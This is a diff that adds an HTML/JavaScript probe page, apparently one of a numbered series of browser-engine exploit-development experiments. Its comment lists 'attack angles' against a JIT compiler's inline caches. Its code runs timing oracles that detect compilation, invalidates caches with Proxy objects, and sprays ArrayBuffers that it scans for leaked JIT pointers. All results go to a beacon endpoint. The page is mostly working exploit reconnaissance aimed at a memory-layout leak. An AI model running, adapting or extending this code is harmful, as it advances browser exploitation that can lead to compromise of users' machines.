@@ -1,0 +1,322 @@
+<!--
+  p768: Proxy IC patch / JIT compilation oracle
+
+  DFG JIT compiles monomorphic property accesses into inline caches (ICs)
+  that embed the target Structure's ID and the property offset. When a
+  Proxy is introduced into a previously-monomorphic call site, the IC
+  must be patched or the code deoptimized (OSR exit).
+
+  Key insight: the TIMING of IC invalidation reveals whether DFG has
+  compiled a particular function. A compiled function with a patched IC
+  takes a different path (slow property lookup) than an interpreted one.
+  By measuring the latency spike when a Proxy object first hits a
+  DFG-compiled IC, we can detect:
+  1) Whether DFG compilation happened (timing delta)
+  2) How many ICs were patched (proportional to property count)
+  3) Whether the patched IC stub was allocated in JIT memory
+
+  Additionally: when DFG compiles a function, it allocates executable
+  memory for IC stubs. These stubs contain direct pointers back to the
+  CodeBlock. If we can force IC stub deallocation (by invalidating the
+  IC via Proxy pollution) and then spray ArrayBuffers of matching size,
+  we might observe residual IC stub content -- which contains JIT region
+  pointers.
+
+  The Proxy handler's get/set/has traps fire synchronously during
+  property access, giving us a precise interception point inside the
+  IC slow path.
+
+  Attack angles:
+  A) IC invalidation timing as DFG compilation detector.
+  B) Proxy trap callback counting during IC transition.
+  C) IC stub size measurement via GC pressure after invalidation.
+  D) Structure transition chain length as compilation artifact.
+  E) Megamorphic IC threshold detection via incremental polymorphism.
+  F) OSR exit counter manipulation via alternating Proxy/plain objects.
+
+  CRASH_CLASS: LOW (Proxy traps, property access, timing, no side effects)
+  prior art: p766 (IC timing), p765 (JIT CodeBlock spray), p602 (DFG confirmed)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p768</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p768-START');
+
+// === Section A: IC invalidation timing as DFG detector ===
+try{
+  b('A-ic-invalidation');
+
+  function makeMonoFn(){
+    return new Function('obj','return obj.x + obj.y + obj.z;');
+  }
+
+  var fn=makeMonoFn();
+  var plain={x:1,y:2,z:3};
+
+  for(var i=0;i<100000;i++)fn(plain);
+
+  var trapCount=0;
+  var proxy=new Proxy({x:10,y:20,z:30},{
+    get:function(t,p,r){
+      trapCount++;
+      return Reflect.get(t,p,r);
+    }
+  });
+
+  var t0=Date.now();
+  for(var i=0;i<1000;i++)fn(plain);
+  var tMono=Date.now()-t0;
+
+  trapCount=0;
+  t0=Date.now();
+  var r=fn(proxy);
+  var tFirstProxy=Date.now()-t0;
+  var firstTraps=trapCount;
+  b('A mono_1k='+tMono+'ms first_proxy='+tFirstProxy+'ms traps='+firstTraps+' result='+r);
+
+  trapCount=0;
+  t0=Date.now();
+  for(var i=0;i<1000;i++)fn(proxy);
+  var tProxyWarm=Date.now()-t0;
+  b('A proxy_1k='+tProxyWarm+'ms traps='+trapCount);
+
+  t0=Date.now();
+  for(var i=0;i<1000;i++)fn(plain);
+  var tAfter=Date.now()-t0;
+  b('A plain_after_proxy_1k='+tAfter+'ms');
+
+  b('A ratio_proxy_vs_mono='+(tProxyWarm/Math.max(1,tMono)).toFixed(2));
+  b('A ratio_after_vs_before='+(tAfter/Math.max(1,tMono)).toFixed(2));
+  b('A-DONE');
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: Trap callback counting during IC transition ===
+try{
+  b('B-trap-count');
+
+  var shapes=[];
+  for(var i=0;i<10;i++){
+    var o={x:i};
+    for(var j=0;j<i;j++)o['extra_'+j]=j;
+    shapes.push(o);
+  }
+
+  var fn2=new Function('obj','return obj.x;');
+  for(var i=0;i<50000;i++)fn2(shapes[0]);
+
+  for(var si=0;si<shapes.length;si++){
+    var tc=0;
+    var p=new Proxy(shapes[si],{
+      get:function(t,prop,r){tc++;return Reflect.get(t,prop,r);},
+      has:function(t,prop){tc++;return Reflect.has(t,prop);},
+      getOwnPropertyDescriptor:function(t,prop){tc++;return Reflect.getOwnPropertyDescriptor(t,prop);}
+    });
+    tc=0;
+    fn2(p);
+    b('B shape_'+si+'_props='+(1+si)+' traps='+tc);
+  }
+
+  var fn3=new Function('obj','var s=0;for(var k in obj)s+=obj[k];return s;');
+  for(var i=0;i<50000;i++)fn3({a:1,b:2,c:3});
+
+  var iterTraps=[];
+  var trapLog=[];
+  var ip=new Proxy({a:10,b:20,c:30},{
+    get:function(t,p,r){trapLog.push('get:'+String(p));return Reflect.get(t,p,r);},
+    has:function(t,p){trapLog.push('has:'+String(p));return Reflect.has(t,p);},
+    ownKeys:function(t){trapLog.push('ownKeys');return Reflect.ownKeys(t);},
+    getOwnPropertyDescriptor:function(t,p){trapLog.push('gopd:'+String(p));return Reflect.getOwnPropertyDescriptor(t,p);}
+  });
+  trapLog=[];
+  var r3=fn3(ip);
+  b('B forin_proxy_result='+r3+' traps='+trapLog.length);
+  if(trapLog.length<=20)b('B forin_traps=['+trapLog.join(',')+']');
+  b('B-DONE');
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: IC stub size via GC pressure after invalidation ===
+try{
+  b('C-ic-stub-gc');
+
+  var fns=[];
+  for(var i=0;i<100;i++){
+    var f=new Function('obj','return obj.prop_'+i+';');
+    var o={};
+    o['prop_'+i]=i;
+    for(var w=0;w<50000;w++)f(o);
+    fns.push({fn:f,obj:o});
+  }
+  b('C compiled 100 monomorphic fns');
+
+  var poisonProxy=new Proxy({},{
+    get:function(t,p){return 42;}
+  });
+  for(var i=0;i<fns.length;i++){
+    fns[i].fn(poisonProxy);
+  }
+  b('C invalidated all ICs');
+
+  fns=null;
+  for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+  var SIZES=[32,48,64,96,128,192,256];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var hits=0;
+    var abs=[];
+    for(var i=0;i<500;i++){
+      abs.push(new ArrayBuffer(sz));
+    }
+    for(var i=0;i<abs.length;i++){
+      var dv=new DataView(abs[i]);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b('C-PTR sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    b('C sz='+sz+' hits='+hits);
+    abs=null;
+  }
+  b('C-DONE');
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: Structure transition chain length ===
+try{
+  b('D-transition-chain');
+
+  function measureTransitions(n){
+    var o={};
+    var t0=Date.now();
+    for(var i=0;i<n;i++){
+      o['p'+i]=i;
+    }
+    return Date.now()-t0;
+  }
+
+  var counts=[1,5,10,20,50,100,200,500];
+  for(var ci=0;ci<counts.length;ci++){
+    var n=counts[ci];
+    var times=[];
+    for(var trial=0;trial<5;trial++){
+      times.push(measureTransitions(n));
+    }
+    var mn=times[0],mx=times[0],sum=0;
+    for(var i=0;i<times.length;i++){
+      if(times[i]<mn)mn=times[i];
+      if(times[i]>mx)mx=times[i];
+      sum+=times[i];
+    }
+    b('D n='+n+' min='+mn+' max='+mx+' avg='+(sum/5).toFixed(1)+'ms');
+  }
+
+  var o1={};
+  for(var i=0;i<100;i++)o1['a'+i]=i;
+  var o2={};
+  for(var i=99;i>=0;i--)o2['a'+i]=i;
+  var fn=new Function('o','return o.a50;');
+  for(var i=0;i<50000;i++)fn(o1);
+  var t0=Date.now();
+  for(var i=0;i<100000;i++)fn(o1);
+  var tSame=Date.now()-t0;
+  t0=Date.now();
+  for(var i=0;i<100000;i++)fn(o2);
+  var tReverse=Date.now()-t0;
+  b('D same_order_100k='+tSame+'ms reverse_order_100k='+tReverse+'ms');
+  b('D ratio='+(tReverse/Math.max(1,tSame)).toFixed(2));
+  b('D-DONE');
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: Megamorphic IC threshold ===
+try{
+  b('E-megamorphic');
+
+  var fn=new Function('obj','return obj.x;');
+  var shapes=[];
+  for(var i=0;i<50;i++){
+    var o={x:i};
+    for(var j=0;j<i;j++)o['filler_'+j]=j;
+    shapes.push(o);
+  }
+
+  for(var i=0;i<50000;i++)fn(shapes[0]);
+
+  for(var count=1;count<=50;count++){
+    var t0=Date.now();
+    for(var iter=0;iter<100000;iter++){
+      fn(shapes[iter%count]);
+    }
+    var t=Date.now()-t0;
+    if(count<=10 || count%5===0){
+      b('E shapes='+count+' 100k='+t+'ms');
+    }
+  }
+
+  b('E-DONE');
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: OSR exit counter manipulation ===
+try{
+  b('F-osr-manipulation');
+
+  var fn=new Function('obj','if(typeof obj.x==="number")return obj.x*2;return -1;');
+  for(var i=0;i<100000;i++)fn({x:i});
+
+  var osrProxy=new Proxy({},{
+    get:function(t,p){
+      if(p==='x')return 'not_a_number';
+      return undefined;
+    }
+  });
+
+  var timings=[];
+  for(var round=0;round<20;round++){
+    fn(osrProxy);
+
+    var t0=Date.now();
+    for(var i=0;i<100000;i++)fn({x:i});
+    timings.push(Date.now()-t0);
+  }
+
+  var first5=timings.slice(0,5);
+  var last5=timings.slice(15);
+  b('F first5=['+first5.join(',')+']ms');
+  b('F last5=['+last5.join(',')+']ms');
+
+  var avgFirst=0,avgLast=0;
+  for(var i=0;i<5;i++){avgFirst+=first5[i];avgLast+=last5[i];}
+  avgFirst/=5;avgLast/=5;
+  b('F avg_first5='+avgFirst.toFixed(1)+'ms avg_last5='+avgLast.toFixed(1)+'ms');
+  b('F deopt_trend='+(avgLast>avgFirst*1.5?'DEGRADING':'STABLE'));
+
+  var fn2=new Function('obj','return obj.x|0;');
+  for(var i=0;i<100000;i++)fn2({x:i});
+  var nanProxy=new Proxy({},{get:function(t,p){return NaN;}});
+  var t0=Date.now();
+  fn2(nanProxy);
+  var tNaN=Date.now()-t0;
+  var t1=Date.now();
+  fn2({x:42});
+  var tNormal=Date.now()-t1;
+  b('F nan_proxy='+tNaN+'ms normal_after='+tNormal+'ms');
+  b('F-DONE');
+}catch(e){b('F-ERR '+e.message);}
+
+setTimeout(function(){b('p768-COMPLETE');},1000);
+};
+</script>
+</head>
+<body></body></html>
